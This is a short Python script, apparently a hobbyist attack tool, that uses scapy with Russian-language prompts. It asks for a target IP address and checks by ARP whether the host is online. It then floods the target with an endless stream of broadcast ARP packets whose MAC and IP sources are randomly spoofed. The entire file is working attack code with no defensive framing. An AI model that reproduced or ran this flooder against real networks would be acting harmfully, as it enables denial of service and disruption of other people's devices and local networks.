import scapy.all as scapy
from ip import get_random_ip
from mac import mac
y = "\033[93m"  
g='\033[92m'
r='\033[91m'
res='\033[0m'
c='\033[36m'
def check(ip_c):
    broad=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    uz=scapy.ARP(pdst=ip_c)
    pk=broad/uz
    ans=scapy.srp1(pk,verbose=False,timeout=1)
    if ans:
        return True
    else:
        return False

def flood(ip):
    print(f"{g}[+]{res} Цель:{ip}. Процесс пошёл...")
    try:
        while True:
            rand_mac=mac()
            rand_ip=get_random_ip()
            b=scapy.Ether(dst="ff:ff:ff:ff:ff:ff",src=rand_mac)
            uzel=scapy.ARP(pdst=ip,psrc=rand_ip,hwsrc=rand_mac)
            pkt=b/uzel
            scapy.sendp(pkt,verbose=False)
    except KeyboardInterrupt:
        print(f"{y}[!]{res} Остановлено")
try:
    ip_t=input(f"{c}[*]{res} Введите IP цели:")
    if check(ip_t):
        print(f"{c}[+]{res} Устройство в сети")
        flood(ip_t)
    else:
        print(f"{r}[-]{res} Устройство не в сети")
except:
    print(f"\n{y}[!]{res} Остановлено")